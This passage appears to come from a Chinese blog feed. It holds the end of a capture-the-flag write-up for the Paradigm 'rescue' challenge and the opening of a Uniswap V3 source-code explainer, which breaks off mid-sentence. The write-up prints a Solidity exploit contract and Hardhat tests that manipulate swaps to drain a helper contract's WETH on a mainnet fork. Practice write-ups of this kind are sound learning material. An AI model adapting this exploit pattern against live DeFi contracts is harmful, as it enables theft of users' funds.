class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"approve"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"bool"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"nonpayable"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"totalSupply"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_from"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_to"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"transferFrom"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"bool"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"nonpayable"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"decimals"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"uint8"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_owner"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"name"</span>:<span class="string">"balanceOf"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"balance"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[],<span class="string">"name"</span>:<span class="string">"symbol"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"string"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_to"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"transfer"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"bool"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"nonpayable"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"constant"</span>:<span class="literal">true</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">"_owner"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"name"</span>:<span class="string">"_spender"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;],<span class="string">"name"</span>:<span class="string">"allowance"</span>,<span class="string">"outputs"</span>:[&#123;<span class="string">"name"</span>:<span class="string">""</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"payable"</span>:<span class="literal">false</span>,<span class="string">"stateMutability"</span>:<span class="string">"view"</span>,<span class="string">"type"</span>:<span class="string">"function"</span>&#125;,&#123;<span class="string">"payable"</span>:<span class="literal">true</span>,<span class="string">"stateMutability"</span>:<span class="string">"payable"</span>,<span class="string">"type"</span>:<span class="string">"fallback"</span>&#125;,&#123;<span class="string">"anonymous"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"owner"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"spender"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">false</span>,<span class="string">"name"</span>:<span class="string">"value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"Approval"</span>,<span class="string">"type"</span>:<span class="string">"event"</span>&#125;,&#123;<span class="string">"anonymous"</span>:<span class="literal">false</span>,<span class="string">"inputs"</span>:[&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"from"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">true</span>,<span class="string">"name"</span>:<span class="string">"to"</span>,<span class="string">"type"</span>:<span class="string">"address"</span>&#125;,&#123;<span class="string">"indexed"</span>:<span class="literal">false</span>,<span class="string">"name"</span>:<span class="string">"value"</span>,<span class="string">"type"</span>:<span class="string">"uint256"</span>&#125;],<span class="string">"name"</span>:<span class="string">"Transfer"</span>,<span class="string">"type"</span>:<span class="string">"event"</span>&#125;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> contractAddress = <span class="string">"0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd"</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> provider = <span class="keyword">await</span> ethers.getDefaultProvider();</span><br><span class="line">        <span class="keyword">const</span> MasterLike = <span class="keyword">new</span> ethers.Contract(contractAddress, abi, provider);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)&#123;</span><br><span class="line">            <span class="comment">// let pool_info = await MasterLike.connect(attacker).poolInfo(i);</span></span><br><span class="line">            <span class="keyword">let</span> pool_info = <span class="keyword">await</span> MasterLike.poolInfo(i);</span><br><span class="line">            <span class="keyword">let</span> lp_token = pool_info[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">const</span> pair = <span class="keyword">new</span> ethers.Contract(ethers.utils.getAddress(lp_token), UniswapV2pairLikeAbi, provider);</span><br><span class="line">            <span class="keyword">const</span> token0 = <span class="keyword">await</span> pair.token0();</span><br><span class="line">            <span class="keyword">let</span> token1 = <span class="keyword">await</span> pair.token1();</span><br><span class="line">            <span class="keyword">let</span> token_contract0 = <span class="keyword">new</span> ethers.Contract(token0, erc20_abi, provider);</span><br><span class="line">            <span class="keyword">let</span> token_contract1 = <span class="keyword">new</span> ethers.Contract(token1, erc20_abi, provider);</span><br><span class="line">            <span class="keyword">let</span> token0_name = <span class="keyword">await</span> token_contract0.symbol();</span><br><span class="line">            <span class="keyword">let</span> tokne1_name = <span class="keyword">await</span> token_contract1.symbol();</span><br><span class="line">            <span class="comment">// console.log(lp_token)</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">`lp_token is : <span class="subst">$&#123;lp_token&#125;</span>  token0 is : <span class="subst">$&#123;token0_name&#125;</span> token1 is : <span class="subst">$&#123;tokne1_name&#125;</span>`</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// const ExploitFactory = await ethers.getContractFactory("Exploit",attacker);</span></span><br><span class="line">        <span class="comment">// const exploit = await ExploitFactory.deploy(setup.address, &#123;value : ethers.utils.parseEther("50")&#125;);</span></span><br><span class="line"></span><br><span class="line">        expect(<span class="keyword">await</span> setup.isSolved()).to.equal(<span class="literal">true</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><br>获取到的交易对如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pair_id:0,lp_address:0x06da0fd433C1A5d7a4faa01111c044910A184553,token0:WETH,token1:USDT</span><br><span class="line">pair_id:1,lp_address:0x397FF1542f962076d0BFE58eA045FfA2d347ACa0,token0:USDC,token1:WETH</span><br><span class="line">pair_id:2,lp_address:0xC3D03e4F041Fd4cD388c549Ee2A29a9E5075882f,token0:DAI,token1:WETH</span><br><span class="line">pair_id:3,lp_address:0xF1F85b2C54a2bD284B1cf4141D64fD171Bd85539,token0:sUSD,token1:WETH</span><br><span class="line">pair_id:4,lp_address:0x31503dcb60119A812feE820bb7042752019F2355,token0:COMP,token1:WETH</span><br><span class="line">pair_id:5,lp_address:0x5E63360E891BD60C69445970256C260b0A6A54c6,token0:LEND,token1:WETH</span><br><span class="line">pair_id:6,lp_address:0xA1d7b2d891e3A1f9ef4bBC5be20630C2FEB1c470,token0:SNX,token1:WETH</span><br><span class="line">pair_id:7,lp_address:0x001b6450083E531A5a7Bf310BD2c1Af4247E23D4,token0:UMA,token1:WETH</span><br><span class="line">pair_id:8,lp_address:0xC40D16476380e4037e6b1A2594cAF6a6cc8Da967,token0:LINK,token1:WETH</span><br><span class="line">pair_id:9,lp_address:0xA75F7c2F025f470355515482BdE9EFA8153536A8,token0:BAND,token1:WETH</span><br><span class="line">pair_id:10,lp_address:0xCb2286d9471cc185281c4f763d34A962ED212962,token0:WETH,token1:AMPL</span><br><span class="line">pair_id:11,lp_address:0x088ee5007C98a9677165D78dD2109AE4a3D04d0C,token0:YFI,token1:WETH</span><br><span class="line">pair_id:12,lp_address:0x795065dCc9f64b5614C407a6EFDC400DA6221FB0,token0:SUSHI,token1:WETH</span><br><span class="line">pair_id:13,lp_address:0x611CDe65deA90918c0078ac0400A72B0D25B9bb1,token0:REN,token1:WETH</span><br><span class="line">pair_id:14,lp_address:0xaAD22f5543FCDaA694B68f94Be177B561836AE57,token0:sUSD,token1:$BASED</span><br><span class="line">pair_id:15,lp_address:0x117d4288B3635021a3D612FE05a3Cbf5C717fEf2,token0:SRM,token1:WETH</span><br><span class="line">pair_id:16,lp_address:0x95b54C8Da12BB23F7A5F6E26C38D04aCC6F81820,token0:YAMv2,token1:WETH</span><br><span class="line">pair_id:17,lp_address:0x58Dc5a51fE44589BEb22E8CE67720B5BC5378009,token0:WETH,token1:CRV</span><br><span class="line">pair_id:18,lp_address:0xDafd66636E2561b0284EDdE37e42d192F2844D40,token0:UNI,token1:WETH</span><br><span class="line">pair_id:19,lp_address:0x36e2FCCCc59e5747Ff63a03ea2e5C0c2C14911e7,token0:xSUSHI,token1:WETH</span><br></pre></td></tr></table></figure></p><p>我们可以写出以下攻击合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;UniswapV2Like.sol&quot;;</span><br><span class="line">import &quot;.&#x2F;Setup.sol&quot;; </span><br><span class="line">import &quot;.&#x2F;MasterChefHelper.sol&quot;;</span><br><span class="line">contract Exploit&#123;</span><br><span class="line">    </span><br><span class="line">    constructor(Setup setup) payable &#123;</span><br><span class="line"></span><br><span class="line">        WETH9 weth &#x3D; setup.weth();</span><br><span class="line">MasterChefHelper mcHelper &#x3D; setup.mcHelper();</span><br><span class="line">        UniswapV2RouterLike router &#x3D; UniswapV2RouterLike(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);</span><br><span class="line">        address usdc &#x3D; 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;</span><br><span class="line">        address dai &#x3D; 0x6B175474E89094C44Da98b954EedeAC495271d0F;</span><br><span class="line">weth.approve(address(router), type(uint256).max);</span><br><span class="line"></span><br><span class="line">weth.deposit&#123;value: 40 ether&#125;();</span><br><span class="line"></span><br><span class="line">address[] memory path &#x3D; new address[](2);</span><br><span class="line"></span><br><span class="line">path[0] &#x3D; address(weth);</span><br><span class="line">path[1] &#x3D; usdc;</span><br><span class="line">router.swapExactTokensForTokens(</span><br><span class="line">11 ether,</span><br><span class="line">0,</span><br><span class="line">path,</span><br><span class="line">address(mcHelper),</span><br><span class="line">block.timestamp</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">path[0] &#x3D; address(weth);</span><br><span class="line">path[1] &#x3D; dai;</span><br><span class="line">router.swapExactTokensForTokens(</span><br><span class="line">9 ether,</span><br><span class="line">0,</span><br><span class="line">path,</span><br><span class="line">address(this),</span><br><span class="line">block.timestamp</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">uint256 daiIn &#x3D; 50 * 10 ** 18;</span><br><span class="line">ERC20Like(dai).approve(address(mcHelper), type(uint256).max);</span><br><span class="line">mcHelper.swapTokenForPoolToken(1, dai, daiIn, 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先用11个ETH去交换usdc,交换得到的usdc发送到<code>mcHelper</code>合约,这里的11个ETH其实只要大于10即可,目的是为了将<code>mcHelper</code>里的WETH全部加到流动性池子里.也可以通过<code>getAmountOut</code>函数计算处需要传入的usdc数目。<br>然后我换一些dai到自己合约,以便于触发<code>mcHelper</code>的<code>swapTokenForPoolToken()</code>函数</p><p>js测试代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; expect &#125; = <span class="built_in">require</span>(<span class="string">"chai"</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">'hardhat'</span>);</span><br><span class="line"><span class="keyword">const</span> masterLike = <span class="built_in">require</span>(<span class="string">'../contracts/rescue/MatserChefLike.json'</span>)</span><br><span class="line">describe(<span class="string">"Challange rescue"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> attacker,deployer;</span><br><span class="line">    it(<span class="string">"should return the solved"</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        [attacker,deployer] = <span class="keyword">await</span> ethers.getSigners();</span><br><span class="line">        <span class="keyword">const</span> Weth = <span class="keyword">await</span> ethers.getContractAt(<span class="string">"WETH9"</span>,<span class="string">"0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"</span>, attacker);</span><br><span class="line">        <span class="keyword">const</span> SetupFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"Setup"</span>, attacker);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">const</span> setup = <span class="keyword">await</span> SetupFactory.deploy(&#123;</span><br><span class="line">            value: ethers.utils.parseEther(<span class="string">"50"</span>)</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//Exploit</span></span><br><span class="line">        <span class="comment">// let abi = [&#123;"inputs":[&#123;"internalType":"uint256","name":"id","type":"uint256"&#125;],"name":"poolInfo","outputs":[&#123;"internalType":"address","name":"lpToken","type":"address"&#125;,&#123;"internalType":"uint256","name":"allocPoint","type":"uint256"&#125;,&#123;"internalType":"uint256","name":"lastRewardBlock","type":"uint256"&#125;,&#123;"internalType":"uint256","name":"accSushiPerShare","type":"uint256"&#125;],"stateMutability":"nonpayable","type":"function"&#125;];</span></span><br><span class="line">        <span class="comment">// let contractAddress = "0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd";</span></span><br><span class="line">        <span class="comment">// let provider = await ethers.getDefaultProvider();</span></span><br><span class="line">        <span class="comment">// const MasterLike = new ethers.Contract(contractAddress, abi, provider);</span></span><br><span class="line">        <span class="comment">// // const MasterLike = await ethers.getContractAt("MasterChefLike","0xc2EdaD668740f1aA35E4D8f227fB8E17dcA888Cd", deployer);</span></span><br><span class="line">        <span class="comment">// for(let i = 0; i &lt; 5; i++)&#123;</span></span><br><span class="line">        <span class="comment">//     let tx = await MasterLike.connect(attacker).poolInfo(i);</span></span><br><span class="line">        <span class="comment">//     let pool_info = await tx.wait();</span></span><br><span class="line">        <span class="comment">//     // let pool_info = MasterLike.connect(attacker).poolInfo(i);</span></span><br><span class="line">        <span class="comment">//     // let lp_token = tx[i];</span></span><br><span class="line">        <span class="comment">//     // console.log(pool_info);</span></span><br><span class="line">        <span class="comment">//     console.log(tx);</span></span><br><span class="line">        <span class="comment">//     console.log(pool_info);</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> ExploitFactory = <span class="keyword">await</span> ethers.getContractFactory(<span class="string">"Exploit"</span>,attacker);</span><br><span class="line">        <span class="keyword">const</span> exploit = <span class="keyword">await</span> ExploitFactory.deploy(setup.address, &#123;<span class="attr">value</span> : ethers.utils.parseEther(<span class="string">"50"</span>)&#125;);</span><br><span class="line"></span><br><span class="line">        expect(<span class="keyword">await</span> setup.isSolved()).to.equal(<span class="literal">true</span>)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Paradigm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Uniswap_V3 源码分析</title>
      <link href="/uniswap-v3/"/>
      <url>/uniswap-v3/</url>
      
        <content type="html"><![CDATA[<h1 id="Uniswap-V3-源码解析（一）"><a href="#Uniswap-V3-源码解析（一）" class="headerlink" title="Uniswap V3 源码解析（一）"></a>Uniswap V3 源码解析（一）</h1><pre><code>author: Thomas_Xu</code></pre><p>之前看了v2的源码，但是感觉能写的不多，于是便决定读了v3后把v3和v2连着写一一篇博文。<br>v3版本的实现复杂度和v2已经不是一个量级了，部分算法确实难以摸透。尝试着分析分析吧。</p><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>强烈建议在阅读uniswap v3源码之前，先阅读<a href="https://uniswap.org/blog/uniswap-v3" target="_blank" rel="noopener">官方博客</a>对v3版本的介绍，有能力的话摸透V3的<a href="https://uniswap.org/whitepaper-v3.pdf" target="_blank" rel="noopener">白皮书</a>，熟悉他的实现原理。在本文中也会做出简短的介绍</p><h2 id="Uniswap-v3-白皮书导读"><a href="#Uniswap-v3-白皮书导读" class="headerlink" title="Uniswap v3 白皮书导读"></a>Uniswap v3 白皮书导读</h2><h3 id="集中流动性"><a href="#集中流动性" class="headerlink" title="集中流动性"></a>集中流动性</h3><p>其实V3最大的改变就是 <strong>“集中流动性”</strong> 这个概念，大大提高了资金的利用率。<br>早期版本旨在提供整个价格范围为(0, +∞)的流动性，这很容易实现并且可以有效地聚合流动性，但这意味着池中持有的大部分资产永远不会被触及，这使得资金的利用率很低。例如，v2版本中的DAI/USDC对仅保留约0.50%的资本用于在0.99美元和1.01美元之间进行交易，这是LP期望看到最多交易量并因此赚取最多费用的价格范围。<br><img src="uniswap02.png" alt=""><br>考虑到这一点，允许LP将其流动性集中在比(0,+∞)更小的价格范围内似乎是合理的，在Uniswap V3中将流动性集中在一个有限范围内称为头寸，一个头寸只需要保持足够的储备来支持其范围内的交易，就像V2的一个池子一样。</p><p>在Uniswap v3中，LP可以将资金集中在自定义价格范围内，以所需的价格提供更多的流动性。在此过程中，LP构建了反映其自身偏好的个性化价格曲线。<br><img src="uniswap01.png" alt=""><br>LP可以在单个池中组合任意数量的不同集中头寸。例如，ETH/DAI 池中的 LP 可以选择将 $100 分配给 $1，000-$2，000 的价格范围，并将 $50 分配给 $1，500-$1，750。</p><h3 id="资本效率"><a href="#资本效率" class="headerlink" title="资本效率"></a>资本效率</h3><p>通过集中其流动性，LP可以在指定的价格范围内提供与v2相同的流动性深度，同时将更少的资本置于风险中。节省的资金可以存放在外部，投资于不同的资产，存放在DeFi的其他地方，或用于在指定的价格范围内增加敞口以赚取更多的交易费用。<br><img src="uniswap03.png" alt=""><br><img src="uniswap04.png" alt=""></p><p>让我们举个例子来说明：</p><blockquote><p>Alice和Bob都想在Uniswap v3上的ETH/DAI池中提供流动性，他们每人有100万美元，目前ETH的价格是1500DAI。<br>Alice决定在整个价格范围内部署她的资本(就像她在Uniswap v2中一样)，于是她存入50万DAI和333.33ETH(共值100万美元)<br>Bob则建立了一个集中的仓位，只在1000到2250的价格范围内存款，他存入了91751DAI和61.17ETH，总价值约18.35万美元，他自己保留了另外的81.65万美元，按照自己的喜好进行投资。<br>此时Alice投入的资金是Bob的5.44倍，但只要ETH/DAI价格保持在1000到2250的区间内，则他们赚取的费用是一样的。</p></blockquote><p><img src="example_1.png" alt=""><br>Bob的定制仓位也是他流动资金的一种止损，如果ETH价格跌至0美元，Alice和Bob的流动资金都将完全以ETH计价，然而Bob将只损失15.9万美元，而Alice则损失100万美元，Bob可以用他额外的816,500美元来对冲下行风险，或者投资于任何其他可以想象的策略。<br><img src="example_2.png" alt=""><br>Uniswap v3中LP不需要像v2中的LP那样以较少的资本提供同等的流动性深度，而是可以选择与v2 LP一样以相同的资本量提供更大的深度，这就需要承担更多的价格风险(无常损失)，同时支持更多的交易量，赚取更高的费用.</p><h3 id="活跃的流动性"><a href="#活跃的流动性" class="headerlink" title="活跃的流动性"></a>活跃的流动性</h3><p>如果市场价格超出LP的指定价格范围，则其流动性将从池中有效移除，并且不再赚取费用。在这种状态下，LP的流动性完全由两种资产中价值较低的资产组成，直到市场价格回到其指定的价格范围，或者他们决定更新其范围以考虑当前价格。<br><img src="uniswap05.png" alt=""><br><img src="uniswap06.png" alt=""></p><h3 id="范围订单"><a href="#范围订单" class="headerlink" title="范围订单"></a>范围订单</h3><p>非常小的范围内的头寸的作用类似于限价单——如果超出范围，头寸将从完全由一种资产组成，转变为完全由另一种资产组成(加上应计费用)，这个范围指令和传统的限价指令有两个区别:</p><ul><li>一个仓位的范围有多窄是有限制的，当价格在这个范围内时，限价单可能会被部分执行</li><li>当仓位被越过时，它需要撤回，如果价格回穿该范围，则该头寸将被交易回，从而有效地逆转交易<br><img src="uniswap07.png" alt=""></li></ul><h3 id="灵活的手续费选择"><a href="#灵活的手续费选择" class="headerlink" title="灵活的手续费选择"></a>灵活的手续费选择</h3><p>v3 版本内置了三种梯度的手续费率（0.05%, 0.30%, and 1.00%），同时可以在未来增加更多的费率值。关于手续费的计算过程，这部分放在后文来详解。需要注意的是，由于需要支持多种费率，同一个代币对 v3 版本会有多个不同的流动池。例如 ETH/DAI 代币对，会分成三个池，分别对应 0.05%, 0.30%, 1.00% 的手续费。</p><h3 id="价格精度问题"><a href="#价格精度问题" class="headerlink" title="价格精度问题"></a>价格精度问题</h3><p>因为用户可以在任意 [P0,P1] 价格区间内提供流动性，Uniswap v3 需要保存每一个用户提供流动性的边界价格，即 P0 和 P1。这样就引入了一个新的问题，假设两个用户提供的流动性价格下限分别是 5.00000001 和 5.00000002，那么 Uniswap 需要标记价格为 5.00000001 和 5.00000002 的对应的流动性大小。同时当交易发生时，需要将 [5.00000001,5.00000002] 作为一个单独的价格区间进行计算。这样会导致：</p><ul><li>几乎很难有两个流动性设置相同的价格边界，这样会导致消耗大量合约存储空间保存这些状态</li><li>当进行交易计算时，价格变化被切分成很多个小的范围区间，需要逐一分段进行计算，这会消耗大量的 gas，并且如果范围的价差太小，可能会引发计算精度的问题</li></ul><p>Uniswap v3 解决这个问题的方式是，将 [Pmin,Pmax] 这一段连续的价格范围为，分割成有限个离散的价格点。每一个价格对应一个 <strong>tick</strong>，用户在设置流动性的价格区间时，只能选择这些离散的价格点中的某一个作为流动性的边界价格。<br>Uniswap v3 采用了等比数列的形式确定价格数列，公比为 1.0001。即下一个价格点为当前价格点的 100.01%。<br>如此一来 Uniswap v3 可以提供比较细粒度的价格选择范围（每个可选价格之间的差值为 0.01%），同时又可以将计算的复杂度控制在一定范围内。</p><h3 id="tick-管理"><a href="#tick-管理" class="headerlink" title="tick 管理"></a>tick 管理</h3><p>简单说，一个 tick 就代表 Uniswap 价格的等比数列中的某一个价格(公比为1.001)，因此每一个用户提供的流动性的价格边界可以用 ticklower 和 tickupper 来表示。为了计算的方便，对于每一个交易对，uni 都定义有一个价格为 1 的 tick。</p><pre><code>这样一来，只需要通过整数索引 i 就能找到对应的 tick，并且 i 为 0 时价格为 1.</code></pre><p>Uniswap 不需要记录每个 tick 所有的信息，只需要记录所有作为 upper/lower tick 所包含的流动性元数据即可。看下面这个例子：<br><img src="uniswap08.jpg" alt=""><br>两个用户分别在 [a,c] 和 [b,d] 两个区间提供了流动性 L1 和 L2，对于 Uniswap 来说它会在 a, b, c, d 四个 tick 上记录对应的流动性增减情况。例如当价格从图中从左向右移动时，代币池的流动性需要做对应的增减（即从左侧 tick 进入一个流动性时增加流动性，移出流动性的右侧 tick 时减去相应的流动性）。</p><ul><li><strong>手续费与 tick 的关系</strong><br>我们知道tick越多，价格可选的值越细，但是合约在计算时候的价格区间就可能越多，那么 gas 消耗也会更加的多，因此我们需要让 tick 的数量保持在一个合理的范围内。Uniswap 针对不同类型的代币对推荐使用不同类型的费率。<br>例如稳定比交易对 USDC/USDT，它的范围波动比较小，我们需要给它更精细的价格可选值，并且设置一个比较低的手续费（0.05%）。Uniswap 引入了 tickSpacing 的概念，即每个 tick 之间跳过 N 个 tick，这样让合约在计算的时候，gas 更可控。<br>对于价格波动较小的交易池，我们希望 tickSpacing 更小，这样价格可选值更多，同时也希望费率更低。反之波动大的交易对，可以让 tickSpacing 更大，这样更节约 gas，但是我们希望它的费率更高。</li></ul><h2 id="源码解读"><a href="#源码解读" class="headerlink" title="源码解读"></a>源码解读</h2><h3 id="代码结构"><a href="#代码结构" class="headerlink" title="代码结构"></a>代码结构</h3><p>v3的代码结构和v2几乎没有区别，将合约分成了两个仓库：</p><ul><li><a href="https://github.com/Uniswap/uniswap-v3-core" target="_blank" rel="noopener">uniswap-v3-core</a></li><li><a href="https://github.com/Uniswap/uniswap-v3-periphery" target="_blank" rel="noopener">uniswap-v3-periphery</a></li></ul><p>core 仓库的功能主要包含在以下 2 个合约中：</p><ul><li><p><strong>UniswapV3Factory</strong>：提供创建 pool 的接口，并且追踪所有的 pool</p></li><li><p><strong>UniswapV3Pool</strong>：实现代币交易，流动性管理，交易手续费的收取，oracle 数据管理。接口的实现粒度比较低，不适合普通用户使用，错误的调用其中的接口可能会造成经济上的损失。</p></li></ul><p>periphery仓库的功能主要包含在以下2个合约中：</p><ul><li><strong>SwapRouter</strong>：提供代币交易的接口，它是对 UniswapV3Pool 合约中交易相关接口的进一步封装，前端界面主要与这个合约来进行对接。</li><li><strong>NonfungiblePositionManager：</strong> 用来增加/移除/修改 Pool 的流动性，并且通过 